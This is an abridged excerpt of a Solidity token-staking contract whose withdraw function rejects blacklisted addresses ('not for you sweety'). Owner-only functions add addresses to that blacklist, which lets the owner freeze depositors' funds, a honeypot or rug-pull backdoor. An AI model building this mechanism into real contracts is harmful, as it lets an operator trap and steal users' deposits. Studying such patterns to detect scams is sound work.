...
contract MasterShmaster is Ownable, Pausable {
    ...
    constructor() public {
        GREEN = IERC20(0xaD4707AEc9B7a48D21E5915bFa878032cEa8737c);
        greenPerBlock = 10000;
        startBlock = 0;
        endBlock = 99999999999999999999;
    }
    ...
    function withdraw(uint256 _pid, uint256 _amount) public whenNotPaused {
        ...
        require(!blacklist[msg.sender], "not for you sweety");
        updatePool(_pid);
        uint256 pending = user.amount.mul(pool.accGreenPerShare).div(1e12).sub(user.rewardDebt);
        safeGreenTransfer(msg.sender, pending);
    ...
    function addBlack(address user) external onlyOwner {
        blacklist[user] = true;
    }

    function removeBlack(address user) external onlyOwner {
